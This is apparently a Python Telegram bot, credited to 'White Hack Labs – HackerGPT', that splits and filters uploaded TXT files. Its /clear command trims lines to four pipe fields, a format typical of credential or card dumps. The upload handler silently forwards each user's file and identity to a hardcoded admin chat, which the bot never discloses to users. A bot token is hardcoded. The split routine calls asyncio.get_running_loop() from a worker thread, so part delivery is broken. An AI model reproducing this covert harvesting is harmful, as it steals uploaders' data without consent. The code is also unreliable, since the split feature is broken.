#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Telegram TXT‑Splitter Bot (python‑telegram‑bot v20+)

Features
--------
• Works with large TXT files (up to the Telegram Bot API limit – 20 MiB).
• Handles many users at once – each user’s file is stored separately.
• Commands:
    /start – welcome message
    /spl <N> – split the file into N‑line chunks (both “/spl500” and “/spl 500” work)
    /ext <prefix> – extract lines that start with the given prefix
    /clear – keep only the first four pipe‑separated fields
    /stop – abort a long running split
• For every upload the original file is forwarded to the admin with user info.
• All file operations are done in a thread‑pool so the main event loop stays free.
• Minimal memory usage – files are processed line‑by‑line (streaming).

Author : White Hack Labs – HackerGPT
"""

import asyncio
import logging
import math
import os
import re
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ------------------------------------------------------------------
# 1️⃣  CONFIGURATION
# ------------------------------------------------------------------
TOKEN = "8811033165:AAG_dex1qyxce8GOcKpKTljGjGd9nsLFsXc"          # <-- put your bot token here
ADMIN_ID = 6382539239                  # <-- chat id that receives the uploaded file

# Telegram bots can only receive files up to 20 MiB
MAX_TELEGRAM_FILE_SIZE = 20 * 1024 * 1024  # 20 MiB

# ------------------------------------------------------------------
# 2️⃣  GLOBAL STATE
# ------------------------------------------------------------------
# Maps user_id -> Path of the file they uploaded
saved_files: dict[int, Path] = {}
# Maps user_id -> stop flag for long‑running commands
stop_requests: dict[int, bool] = {}

# Thread pool for blocking file I/O (splitting, filtering, cleaning)
executor = ThreadPoolExecutor(max_workers=4)

# ------------------------------------------------------------------
# 3️⃣  HELPERS
# ------------------------------------------------------------------
def _ensure_dir(path: Path) -> None:
    """Create the directory if it does not exist."""
    path.mkdir(parents=True, exist_ok=True)

def _unique_output_name(prefix: str, suffix: str = "") -> str:
    """Generate a unique file name so that repeated commands do not overwrite."""
    ts = int(time.time() * 1000)
    return f"part_{prefix}_{ts}{suffix}.txt"

async def _send_document(
    ctx: ContextTypes.DEFAULT_TYPE,
    file_path: Path,
    chat_id: int,
    caption: str | None = None,
) -> None:
    """Utility to send a document to a chat."""
    try:
        await ctx.bot.send_document(
            chat_id=chat_id,
            document=file_path,
            caption=caption,
        )
    except Exception as e:
        logging.error("Failed to send document: %s", e)

# ------------------------------------------------------------------
# 4️⃣  COMMANDS
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a welcome message."""
    user = update.effective_user
    name = user.username if user.username else user.first_name
    await update.message.reply_text(
        f"Hello @{name}!\n\n"
        "Upload a file in .txt format⚡"
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the same help message as /start."""
    await start(update, context)

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Signal a running split operation to stop."""
    user_id = update.effective_user.id
    stop_requests[user_id] = True
    await update.message.reply_text("⛔ Process stopped successfully.")

# --------------------------------------------------------------
# File upload – streamed download
# --------------------------------------------------------------
async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the upload of a .txt file."""
    user_id = update.effective_user.id
    try:
        doc = update.message.document
        if not doc:
            await update.message.reply_text("❌ No document found in the message.")
            return

        # 1️⃣  Check that the file is a .txt file
        if not doc.file_name.lower().endswith(".txt"):
            await update.message.reply_text("❌ Please upload a *.txt file only.")
            return

        # 2️⃣  Check Telegram size limit
        if doc.file_size and doc.file_size > MAX_TELEGRAM_FILE_SIZE:
            await update.message.reply_text(
                f"❌ File too large – Telegram bots can only receive files up to "
                f"{MAX_TELEGRAM_FILE_SIZE // (1024*1024)} MB."
            )
            return

        # 3️⃣  Download the file to the uploads/ folder in an async‑friendly way
        uploads_dir = Path("uploads")
        _ensure_dir(uploads_dir)
        file_path = uploads_dir / doc.file_name

        file_obj = await doc.get_file()
        # download_to_drive is synchronous; run it in the executor to keep the event loop free
        await asyncio.get_running_loop().run_in_executor(
            executor,
            lambda: file_obj.download_to_drive(str(file_path))
        )

        # 4️⃣  Register the file for this user
        saved_files[user_id] = file_path

        # 5️⃣  Forward the file to the admin
        user = update.effective_user
        caption = (
            f"New upload received\n"
            f"User: {user.first_name}\n"
            f"Username: @{user.username if user.username else 'N/A'}\n"
            f"User ID: {user_id}"
        )
        await _send_document(context, file_path, ADMIN_ID, caption)

        # 6️⃣  Give the user a friendly reply
        await update.message.reply_text(
            "✅ TXT file received successfully 🔥\n\n"
            "Use commands 👇\n"
            "/spl <N> – Split TXT file\n"
            "/ext <prefix> – Extract prefix lines\n"
            "/clear – Clean TXT file\n"
            "/stop – Abort a long split\n"
            "/help – Show this message again"
        )
    except Exception as e:
        logging.exception("Error in receive_txt")
        await update.message.reply_text(f"❌ Error while processing file: {e}")

# --------------------------------------------------------------
# /ext – extract lines that start with a prefix
# --------------------------------------------------------------
async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Extract lines that start with a given prefix (any text)."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    # Grab everything after '/ext' (including spaces)
    parts = update.message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await update.message.reply_text("❌ Please provide a prefix after /ext.")
        return
    prefix = parts[1].strip()

    input_path = saved_files[user_id]
    output_file_name = _unique_output_name(re.sub(r"\W+", "_", prefix), "_ext")
    output_path = Path("uploads") / output_file_name
    _ensure_dir(output_path.parent)

    def stream_extract() -> None:
        """Read input line‑by‑line and write matching lines to output."""
        with open(input_path, "r", encoding="utf-8", errors="ignore") as fin, \
             open(output_path, "w", encoding="utf-8") as fout:
            for line in fin:
                if line.lstrip().startswith(prefix):
                    fout.write(line.rstrip("\n") + "\n")

    await asyncio.get_running_loop().run_in_executor(executor, stream_extract)

    await _send_document(
        context,
        output_path,
        user_id,
        f"Lines starting with '{prefix}'"
    )

# --------------------------------------------------------------
# /clear – keep only the first 4 pipe‑separated fields
# --------------------------------------------------------------
async def clear_words(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Keep only the first 4 pipe‑separated fields."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    input_path = saved_files[user_id]
    output_path = input_path.with_stem(input_path.stem + "_clean")
    _ensure_dir(output_path.parent)

    def stream_clean() -> None:
        with open(input_path, "r", encoding="utf-8", errors="ignore") as fin, \
             open(output_path, "w", encoding="utf-8") as fout:
            for line in fin:
                parts = line.strip().split("|")
                if len(parts) >= 4:
                    fout.write("|".join(part.strip() for part in parts[:4]) + "\n")
                else:
                    fout.write(line.strip() + "\n")

    await asyncio.get_running_loop().run_in_executor(executor, stream_clean)

    await _send_document(
        context,
        output_path,
        user_id,
        "Cleaned file (first 4 pipe fields)"
    )

# --------------------------------------------------------------
# /spl – split the uploaded file into chunks of N lines
# --------------------------------------------------------------
async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Split the uploaded file into chunks of N lines."""
    user_id = update.effective_user.id
    if user_id not in saved_files:
        await update.message.reply_text("Please upload a TXT file first.")
        return

    # Reset stop flag for this user
    stop_requests[user_id] = False

    # Extract the number of lines per chunk
    match = re.search(r"\d+", update.message.text)
    if not match:
        await update.message.reply_text("❌ Please provide a number after /spl.")
        return
    try:
        chunk_size = int(match.group())
        if chunk_size <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Invalid number after /spl.")
        return

    input_path = saved_files[user_id]

    # ---------- First pass: count total lines ----------
    def count_lines() -> int:
        with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for _ in f)

    total_lines = await asyncio.get_running_loop().run_in_executor(executor, count_lines)
    total_parts = math.ceil(total_lines / chunk_size)

    await update.message.reply_text(
        f"🚀 Processing started…\n\n"
        f"Total Lines: {total_lines}\n"
        f"Lines Per File: {chunk_size}\n"
        f"Files To Be Created: {total_parts}\n\n"
        f"Use /stop to cancel the process."
    )

    # ---------- Second pass: stream split ----------
    part_no = 1
    current_chunk: list[str] = []

    def stream_split() -> None:
        nonlocal part_no, current_chunk
        with open(input_path, "r", encoding="utf-8", errors="ignore") as fin:
            for line in fin:
                if stop_requests.get(user_id, False):
                    return  # abort early

                current_chunk.append(line.rstrip("\n"))
                if len(current_chunk) >= chunk_size:
                    output_file_name = _unique_output_name(str(part_no), "_spl")
                    output_path = Path("uploads") / output_file_name
                    _ensure_dir(output_path.parent)
                    with open(output_path, "w", encoding="utf-8") as fout:
                        fout.write("\n".join(current_chunk))
                    # Send the part
                    asyncio.run_coroutine_threadsafe(
                        _send_document(context, output_path, user_id,
                                       f"Part {part_no}/{total_parts}"),
                        asyncio.get_running_loop()
                    )
                    part_no += 1
                    current_chunk = []

            # Write the last chunk (if any)
            if current_chunk and not stop_requests.get(user_id, False):
                output_file_name = _unique_output_name(str(part_no), "_spl")
                output_path = Path("uploads") / output_file_name
                _ensure_dir(output_path.parent)
                with open(output_path, "w", encoding="utf-8") as fout:
                    fout.write("\n".join(current_chunk))
                asyncio.run_coroutine_threadsafe(
                    _send_document(context, output_path, user_id,
                                   f"Part {part_no}/{total_parts}"),
                    asyncio.get_running_loop()
                )

    await asyncio.get_running_loop().run_in_executor(executor, stream_split)

    if not stop_requests.get(user_id, False):
        await update.message.reply_text("✅ Done!")

# ------------------------------------------------------------------
# 5️⃣  HANDLER SETUP & BOT LAUNCH
# ------------------------------------------------------------------
app = Application.builder().token(TOKEN).build()

# Basic commands
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_cmd))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CommandHandler("clear", clear_words))

# File upload handler
app.add_handler(MessageHandler(filters.Document.ALL, receive_txt))

# Regex commands (both spaced and no‑space forms)
app.add_handler(MessageHandler(filters.Regex(r"^/spl(?:\s*\d+)$"), split_file))
app.add_handler(MessageHandler(filters.Regex(r"^/ext\b"), extract_prefix))

# Start the bot
if __name__ == "__main__":
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        level=logging.INFO,
    )
    print("Bot Running…")
    app.run_polling()
